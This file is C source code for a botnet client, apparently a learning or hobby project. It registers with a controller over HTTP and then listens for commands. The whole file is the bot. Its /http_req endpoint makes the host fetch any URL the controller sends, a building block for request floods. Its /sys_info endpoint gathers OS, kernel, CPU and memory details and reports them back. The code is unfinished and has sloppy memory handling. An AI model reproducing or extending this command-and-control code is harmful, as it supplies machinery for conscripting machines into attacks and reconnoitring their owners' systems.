#include "bot.h"

char host[256] = {0};
char *IP = {0};
long port = 2324;
int ret = 0;
struct MHD_Daemon *mhd_daemon;

int main(int argc, char const *argv[])
{

    /*
     * Connect to controller and send http request like so: http://localhost:8081?PORT=2343&IP=1.2.3.2
     * then close connection and mantain connection on port specified
     * react to commands: HTTP_REQ -> EMAIL -> SYS_INFO
     * after performing such operation inform controller that operation has ended
     */
    setBotIP();
    setBotPort();

    ret = -1;

    while (ret < 0)
    {
        ret = connectToController();

        if (ret < 0)
        {
            printf("\nConnection failed retry after 15 seconds");
        }
        fflush(stdout);
        sleep(15);
    }

    const union MHD_ConnectionInfo *conninfo;

    mhd_daemon = MHD_start_daemon(MHD_USE_SELECT_INTERNALLY, port, NULL, NULL, &handle_request, NULL, MHD_OPTION_END);
    if (mhd_daemon == NULL)
    {
        fprintf(stderr, "Error starting daemon.\n");
        _exit(EXIT_FAILURE);
    }

    fprintf(stdout, "Passive mode: listening on port : %ld.\n", port);

    while (1)
    {
    }
    return 0;
}

int connectToController()
{
    ret = 1;

    CURL *curl;
    curl = curl_easy_init();
    if (curl == NULL)
        handle_error("Could not execute command, error initializing curl handle");

    // * ### BUILD URL ###
    char *url  = (char *)malloc(sizeof(char)*strlen(PROTOCOL)*strlen(IP)*strlen(C_PORT)*strlen(C_IP) + sizeof(long) * 5);
    if(url == NULL){
        printf("DAMN");
    }

    strcpy(url, PROTOCOL);
    strcat(url, "127.0.1.1");
    // strcat(url, getenv(CONTROLLER_IP));

    char *query = (char *)malloc(16 + sizeof(IP) + 5);
    sprintf(query, "?PORT=%ld&IP=%s", port, IP);

    strcat(url, query);

    // * ### BUILD URL ###

    curl_easy_setopt(curl, CURLOPT_LOCALPORT, port);
    curl_easy_setopt(curl, CURLOPT_PORT, CONTROLLER_PORT);
    curl_easy_setopt(curl, CURLOPT_LOCALPORTRANGE, 65535);
    // curl_easy_setopt(curl, CURLOPT_NOBODY, 1);

    // * create url
    curl_easy_setopt(curl, CURLOPT_URL, url);

    printf("\n Connecting to controller...");
    ret = curl_easy_perform(curl);

    // curl_easy_getinfo(curl, CURLINFO_PRIMARY_PORT, &port);
    if (ret == CURLE_OK)
    {
        long port;
        ret = curl_easy_getinfo(curl, CURLINFO_PRIMARY_PORT, &port);
        if (!ret){
            printf("\nConnected to remote port: %ld , url: %s\n", port, url);
        }
            ret = 1;
    }
    else
    {
        ret = -1;
    }

    curl_easy_cleanup(curl);

    free(url);
    free(query);

    return ret;
}

void setBotIP()

{
    struct hostent *host_entry;
    int hostname;
    hostname = gethostname(host, sizeof(host));                      // find the host name
    host_entry = gethostbyname(host);                                // find host information
    IP = inet_ntoa(*((struct in_addr *)host_entry->h_addr_list[0])); // Convert into IP string

    printf("Current Host Name: %s\n", host);
    printf("Host IP: %s\n", IP);
}

int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
                   const char *method, const char *version, const char *upload_data,
                   size_t *upload_data_size, void **con_cls)
{

    const char *msg = "DONE";
    struct MHD_Response *response;
    int ret;

    response = MHD_create_response_from_buffer(strlen(msg), (void *)msg, MHD_RESPMEM_PERSISTENT);

    char *endpoint;
    endpoint = strstr(url, "/http_req");
    if (endpoint != NULL)
    {
        printf("Sending request...\n");
        char *request = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, "request");
        ret = sendRequestToTarget(request);

        endpoint = NULL;
    }

    endpoint = strstr(url, "/sys_info");
    if (endpoint != NULL)
    {
        // TODO handle sys_info
        char info[1000000] = {0};
        ret = getSystemInfo(info);
        response = MHD_create_response_from_buffer(strlen(info), (void *)info, MHD_RESPMEM_PERSISTENT);

        endpoint = NULL;
    }

    
    notifyController();

    // TODO create a method that send a request(response?) to controller in order to notify it that action has been performed, the controller will update the botnet info
    ret = MHD_queue_response(connection, MHD_HTTP_OK, response);
    MHD_destroy_response(response);

    return ret;
}

int sendRequestToTarget(const char *request)
{

    CURL *curl;

    curl = curl_easy_init();

    if (curl == NULL)
        handle_error("Could not execute command, error initializing curl handle");
    // curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
    curl_easy_setopt(curl, CURLOPT_URL, request);

    ret = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    return 1;
}

int getSystemInfo(char *info)
{

    struct utsname buff;
    struct sysinfo si;
    int i;

    const double megabyte = 1024 * 1024;
    uname(&buff);
    sysinfo(&si);

    i = sprintf(info, "NodeName = %s\n", buff.nodename);
    i += sprintf(info + i, "System OS = %s\n", buff.sysname);
    i += sprintf(info + i, "Kernel Release = %s\n", buff.release);
    i += sprintf(info + i, "System Version = %s\n", buff.version);
    i += sprintf(info + i, "CPU Architecture = %s\n", buff.machine);

    // printf("CPU model = %s\n", );

    FILE *cpuinfo = fopen("/proc/cpuinfo", "rb");
    FILE *file;
    char line[1024];
    char modelName[1024];
    char cpuMhz[1024];
    char cacheSize[1024];
    char cores[1024];

    file = fopen("/proc/cpuinfo", "rb");

    if (file == NULL)
    {
        printf("Error opening file\n");
    }
    else
    {
        while (fgets(line, sizeof(line), file))
        {
            if (strstr(line, "model name") != NULL)
            {
                strcpy(modelName, line);
                // break;
            }
            if (strstr(line, "cpu cores") != NULL)
            {
                strcpy(cores, line);
                // break;
            }
            if (strstr(line, "cpu MHz") != NULL)
            {
                strcpy(cpuMhz, line);
                cpuMhz[strcspn(cpuMhz, "\n")] = 0;
                strcat(cpuMhz, " Mhz\n");
                // break;
            }
            if (strstr(line, "cache size") != NULL)
            {
                strcpy(cacheSize, line);
                // break;
            }
        }
        fclose(file);
    }

    i += sprintf(info + i, "%s", modelName);
    i += sprintf(info + i, "%s", cores);
    i += sprintf(info + i, "%s", cacheSize);
    i += sprintf(info + i, "%s", cpuMhz);

    i += sprintf(info + i, "Total RAM = %5.lfMB\n", si.totalram / megabyte);
    i += sprintf(info + i, "Free RAM = %5.lfMB\n", si.freeram / megabyte);

    printf("Sending following info about system: %s", info);
    return 1;
}

void notifyController()
{

    CURL *curl;

    curl = curl_easy_init();

    if (curl == NULL)
        handle_error("Could not execute command, error initializing curl handle");

    char url[255] = {0};
    char buff[sizeof(long) * 8 + 1];
    sprintf(buff, "%ld", port);
    strcpy(url, CONTROLLER_NOTIFY_ENDPOINT);
    strcat(url, IP);
    strcat(url, "&PORT=");
    strcat(url, buff);

    printf("Sending notification to : %s \n", url);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_PORT, CONTROLLER_PORT);

    ret = curl_easy_perform(curl);

    printf("Response : ");

    curl_easy_cleanup(curl);
}

void setBotPort(){

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = htons(0);

    if (bind(sockfd, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    socklen_t len = sizeof(addr);
    if (getsockname(sockfd, (struct sockaddr*)&addr, &len) == -1) {
        perror("getsockname");
        exit(EXIT_FAILURE);
    }

    port = (long) ntohs(addr.sin_port);
    printf("Free port: %ld\n", port);

    close(sockfd);


}